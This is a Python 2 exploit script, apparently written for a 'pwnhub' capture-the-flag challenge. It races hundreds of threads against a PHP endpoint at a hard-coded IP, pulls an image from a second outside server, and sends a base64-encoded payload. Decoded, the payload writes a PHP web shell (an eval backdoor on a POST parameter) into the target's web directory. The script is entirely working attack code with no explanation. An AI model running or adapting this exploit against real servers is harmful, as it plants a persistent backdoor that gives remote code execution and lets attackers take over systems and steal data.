# -*- coding:utf-8 -*-

import requests

import threading
from random import Random

url = "http://52.80.32.116/2d9bc625acb1ba5d0db6f8d0c8b9d206/a9b4d7cc810da015142f61f7e236d50b.php"

def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 19
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str


def put_session(cookies):
    headers = {"Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cookie": "PHPSESSID="+cookies,
               "Connection": "keep-alive"}
    datas = {"image": "http://121.42.175.111:9999/pwnhub.png"}
    r = requests.post(url, headers=headers, data=datas)
    print r.content


def get_eval(cookies):
    headers = {"Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cookie": "PHPSESSID="+cookies,
               "Connection": "keep-alive"}
    data_eval = {
        "pwnhub": "ZnB1dHMoZm9wZW4oJy92YXIvd3d3L2h0bWwvMmQ5YmM2MjVhY2IxYmE1ZDBkYjZmOGQwYzhiOWQyMDYvaW1hZ2UvYW5nZWxzaGVsbC5waHAnLCJ3IiksJzw/cGhwIGV2YWwoJF9QT1NUW1wnY2hvcHBlcjEyM1wnXSk7Pz4nKTs="}
    r = requests.post(url + "?pwnhub=firesun", headers=headers, data=data_eval)
    print r.content
    if not (r.content == "no image:("):
        print r.content
        exit()


for i in range(0,300):
    cookies = random_str(26)
    threading.Thread(target=put_session,args = (cookies,)).start()
    threading.Thread(target=get_eval,args = (cookies,)).start()
